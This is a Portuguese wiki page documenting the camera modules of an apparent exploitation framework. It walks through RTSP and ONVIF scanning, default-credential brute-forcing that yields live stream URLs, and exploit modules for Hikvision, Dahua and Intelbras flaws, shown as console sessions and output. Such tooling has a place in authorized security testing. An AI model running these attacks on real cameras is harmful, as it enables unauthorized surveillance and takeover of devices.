# Engine RTSP e Exploração de Câmeras

**Idioma:** Português (pt-BR). **English:** — *(página exclusiva pt-BR)*

---

## Visão geral

O EmbedXPL-Forge inclui um engine RTSP especializado para descoberta, fingerprinting e exploração de câmeras IP. Ele integra múltiplos vetores de ataque específicos para o protocolo RTSP e para as interfaces de gerenciamento web das câmeras.

---

## Arquitetura do engine de câmera

```
embedxpl/core/
├── rtsp/
│   ├── rtsp_client.py          Cliente RTSP nativo com suporte a DESCRIBE/OPTIONS
│   ├── cameradar_bridge.py     Integração com Cameradar (brute-force de rotas RTSP)
│   └── stream_analyzer.py      Análise de stream RTSP (codec, resolução, FPS)
│
├── camera/
│   ├── onvif_client.py         Cliente ONVIF WS-Discovery e GetDeviceInformation
│   ├── snapshot_tester.py      Testador de acesso a snapshots (30+ endpoints)
│   └── fingerprinter.py        Fingerprinting de câmera por banner HTTP/RTSP/ONVIF
```

---

## Scanners de câmera

### `camera_scan` — descoberta geral de câmeras

```text
exf > use scanners/cameras/camera_scan
exf (Camera Scan) > set target 192.168.1.0/24
[+] target => 192.168.1.0/24
exf (Camera Scan) > show options

Module options:
┌──────────────────┬──────────────────┬───────────────────────────────────────────┐
│ Name             │ Current settings │ Description                               │
├──────────────────┼──────────────────┼───────────────────────────────────────────┤
│ check_http       │ True             │ Probe HTTP (port 80/8080/8443)             │
│ check_rtsp       │ True             │ Probe RTSP (port 554/5554/8554)           │
│ check_onvif      │ True             │ Probe ONVIF WS-Discovery                  │
│ check_p2p        │ False            │ Probe P2P UID (port 37777 - Dahua)        │
│ threads          │ 16               │ Concurrency for scanning                  │
│ timeout          │ 5                │ Per-probe timeout in seconds              │
└──────────────────┴──────────────────┴───────────────────────────────────────────┘

exf (Camera Scan) > run
[*] Running module ...
[*] Scanning 192.168.1.0/24 for cameras...
[+] 192.168.1.50  - Hikvision DS-2CD2143G2-I  [HTTP:80, RTSP:554, ONVIF:80]
[+] 192.168.1.51  - Dahua IPC-HDW2831T        [HTTP:80, RTSP:554, P2P:37777]
[+] 192.168.1.52  - Axis P3245-V              [HTTP:80, RTSP:554, ONVIF:80]
[+] 192.168.1.53  - Herospeed N3116           [HTTP:80, RTSP:554]
[+] Found 4 camera(s) on network
```

---

### `rtsp_discover` — descoberta de streams RTSP

```text
exf > use scanners/cameras/rtsp_discover
exf (RTSP Discover) > set target 192.168.1.0/24
[+] target => 192.168.1.0/24
exf (RTSP Discover) > run
[*] Running module ...
[*] Probing RTSP on 192.168.1.0/24 (ports 554, 5554, 8554)...
[+] 192.168.1.50:554  - RTSP/1.0 server detected
    Banner: RTSP/1.0 200 OK\r\nServer: Hikvision-Webs
    Stream paths found: /h264/ch1/main/av_stream, /h264/ch1/sub/av_stream
[+] 192.168.1.51:554  - RTSP/1.0 server detected
    Banner: RTSP/1.0 200 OK\r\nServer: DH-IPC
    Stream paths found: /cam/realmonitor?channel=1&subtype=0
[+] Found 2 RTSP server(s)
```

---

### `rtsp_scanner` — scanner RTSP com brute-force de credenciais

```text
exf > use scanners/cameras/rtsp_scanner
exf (RTSP Scanner) > set target 192.168.1.50
[+] target => 192.168.1.50
exf (RTSP Scanner) > run
[*] Running module ...
[*] Testing RTSP on 192.168.1.50:554...
[*] Trying anonymous access: rtsp://192.168.1.50:554/...
[-] Anonymous access denied (401 Unauthorized)
[*] Trying admin:admin on rtsp://192.168.1.50:554/h264/ch1/main/av_stream...
[-] FAIL: admin:admin (401)
[*] Trying admin:12345 on rtsp://192.168.1.50:554/h264/ch1/main/av_stream...
[+] SUCCESS: admin:12345 — RTSP stream accessible
[+] Stream: rtsp://admin:12345@192.168.1.50:554/h264/ch1/main/av_stream
```

---

## Fingerprinting de câmeras

### Identificação por ONVIF

O protocolo ONVIF (Open Network Video Interface Forum) é suportado pela maioria das câmeras IP modernas e fornece informações detalhadas do dispositivo:

```text
exf > use scanners/cameras/camera_scan
exf (Camera Scan) > set target 192.168.1.50
[+] target => 192.168.1.50
exf (Camera Scan) > set check_onvif true
[+] check_onvif => true
exf (Camera Scan) > run
[*] Running module ...
[*] ONVIF GetDeviceInformation on 192.168.1.50...
[+] ONVIF Device Information:
    Manufacturer: Hikvision
    Model: DS-2CD2143G2-I
    FirmwareVersion: V5.7.16 build 230415
    SerialNumber: DS-2CD2143G2-I20230415AABBCC
    HardwareId: 0x0000
[*] ONVIF GetProfiles on 192.168.1.50...
[+] Profiles available:
    - MainStream (1920x1080, H.264)
    - SubStream (640x480, H.264)
```

---

### Herospeed/Longsee — scanner específico

```text
exf > use scanners/cameras/herospeed_longsee_nvr_scan
exf (Herospeed/Longsee NVR Scanner) > set target 192.168.1.60
[+] target => 192.168.1.60
exf (Herospeed/Longsee NVR Scanner) > run
[*] Running module ...
[*] Probing Herospeed/Longsee NVR at 192.168.1.60:80...
[*] Checking for variable.js fingerprint...
[+] Herospeed/Longsee platform confirmed (statics/js/variable.js present)
[*] Checking firmware version...
[+] Firmware: v2.0.6 (MC6830 platform)
[*] Checking HSLS-2026-001 (unauthenticated account enum)...
[+] HSLS-2026-001 vulnerable — accounts: admin, operator
[*] Checking HSLS-2026-004 (hardcoded root hash)...
[+] HSLS-2026-004 vulnerable — root hash: 12ZpTwfyH6/Bs
[+] NVR is VULNERABLE to 4 advisories
    use exploits/cameras/herospeed/herospeed_nvr_unauth_account_enum
    use exploits/cameras/herospeed/herospeed_nvr_hardcoded_root_hash
    use exploits/cameras/herospeed/herospeed_nvr_telnet_safecode_backdoor
    use exploits/cameras/herospeed/herospeed_nvr_paramconfig_bypass
```

---

## Intelbras — câmeras OEM Dahua

As câmeras Intelbras usam firmware derivado da Dahua e são vulneráveis às mesmas CVEs:

```text
exf > use scanners/cameras/intelbras_cctv_discover
exf (Intelbras CCTV Discover) > set target 192.168.1.0/24
[+] target => 192.168.1.0/24
exf (Intelbras_cctv_discover) > run
[*] Running module ...
[*] Scanning for Intelbras cameras...
[+] 192.168.1.70 — Intelbras VIP 1120 D G2 (OEM Dahua, firmware 2.622.0000)
    Vulnerabilities: CVE-2021-33044, CVE-2021-36260 (Dahua variants)
    Suggested modules:
    use exploits/cameras/intelbras/cctv_dahua_auth_bypass
    use exploits/cameras/intelbras/cctv_dahua_rce_cve_2021_36260
```

---

## Ataque RTSP via Cameradar

O módulo `rtsp_cameradar_attack` integra a ferramenta Cameradar para ataques de brute-force em rotas e credenciais RTSP:

```text
exf > use exploits/cameras/multi/rtsp_cameradar_attack
exf (RTSP Cameradar Attack) > set target 192.168.1.50
[+] target => 192.168.1.50
exf (RTSP Cameradar Attack) > show options

Module options:
┌────────────────────┬──────────────────┬────────────────────────────────────────────────────┐
│ Name               │ Current settings │ Description                                        │
├────────────────────┼──────────────────┼────────────────────────────────────────────────────┤
│ wordlist_routes    │ built-in         │ Wordlist of RTSP routes to try (file:// for custom)│
│ wordlist_creds     │ built-in         │ Wordlist of credentials to try                     │
│ threads            │ 8                │ Concurrent connection threads                       │
│ timeout            │ 5                │ Per-attempt timeout in seconds                     │
└────────────────────┴──────────────────┴────────────────────────────────────────────────────┘

exf (RTSP Cameradar Attack) > run
[*] Running module ...
[*] Starting Cameradar-style RTSP attack on 192.168.1.50:554...
[*] Phase 1: Route discovery (200+ common paths)...
[+] Route found: /h264/ch1/main/av_stream
[+] Route found: /h264/ch1/sub/av_stream
[*] Phase 2: Credential brute-force on discovered routes...
[+] SUCCESS: admin:12345 on rtsp://192.168.1.50:554/h264/ch1/main/av_stream
[+] Stream URL: rtsp://admin:12345@192.168.1.50:554/h264/ch1/main/av_stream
```

---

## Dahua — varredura de câmeras via protocolo proprietário

```text
exf > use scanners/cameras/dahua/p2p_pppp_scan
exf (Dahua P2P PPPP Scanner) > set target 192.168.1.0/24
[+] target => 192.168.1.0/24
exf (Dahua P2P PPPP Scanner) > run
[*] Running module ...
[*] Scanning for Dahua P2P cameras (port 37777)...
[+] 192.168.1.51 — Dahua (37777 open)
    P2P UID: 2L1A234KAZ00000 (extractable without authentication)
[*] Use exploits/cameras/reolink/reolink_nvr_p2p_uid_extract_cve_2022_30600 for similar
    Use exploits/cameras/dahua/cctv_37777_credential_extraction for direct exploitation
```

---

## Tabela de referência de scanners de câmera

| Módulo | Porta padrão | Protocolo | Vendors alvo |
|--------|-------------|-----------|-------------|
| `scanners/cameras/camera_scan` | 80,554,8080 | HTTP/RTSP/ONVIF | Universal |
| `scanners/cameras/rtsp_discover` | 554,5554,8554 | RTSP | Universal |
| `scanners/cameras/rtsp_scanner` | 554 | RTSP | Universal |
| `scanners/cameras/herospeed_longsee_nvr_scan` | 80 | HTTP | Herospeed, TVT, GISE, Longse |
| `scanners/cameras/intelbras_cctv_discover` | 80 | HTTP | Intelbras |
| `scanners/cameras/intelbras_boa_detect` | 80 | HTTP | Intelbras (BOA server) |
| `scanners/cameras/intelbras_onvif_scan` | 80 | ONVIF | Intelbras |
| `scanners/cameras/intelbras_p2p_uid_scan` | 37777 | P2P | Intelbras |
| `scanners/cameras/intelbras_pvip_discover` | 80 | HTTP | Intelbras PVIP |
| `scanners/cameras/tvip_discover` | 80,554 | HTTP/RTSP | TVIP cameras |
| `scanners/cameras/dahua/cctv_discover` | 37777 | Dahua Proto | Dahua, OEMs |
| `scanners/cameras/dahua/p2p_pppp_scan` | 37777 | P2P PPPP | Dahua |
| `scanners/cameras/hikvision/firmware_version_fingerprint` | 80 | HTTP | Hikvision |
| `scanners/cameras/hikvision/boot_permission_audit` | 80 | HTTP | Hikvision |

---

## Fluxo de trabalho recomendado para avaliação de câmeras

```bash
# 1. Descoberta inicial de câmeras na rede
exf > discover 192.168.1.0/24

# 2. Varredura especializada de câmeras
exf > use scanners/cameras/camera_scan
exf (Camera Scan) > set target 192.168.1.0/24
exf (Camera Scan) > run

# 3. Para câmeras Hikvision encontradas
exf > use scanners/cameras/hikvision/firmware_version_fingerprint
exf (Hikvision Firmware Fingerprint) > set target 192.168.1.50
exf (Hikvision Firmware Fingerprint) > run

# 4. Verificar CVE-2021-36260
exf > use exploits/cameras/hikvision/rtsp_rce_cve_2021_36260
exf (Hikvision Unauthenticated RCE) > set target 192.168.1.50
exf (Hikvision Unauthenticated RCE) > check

# 5. Para NVRs Herospeed/Longsee encontrados
exf > use scanners/cameras/herospeed_longsee_nvr_scan
exf (Herospeed/Longsee NVR Scanner) > set target 192.168.1.60
exf (Herospeed/Longsee NVR Scanner) > run
```

---

[Hub da Wiki](../README.md)
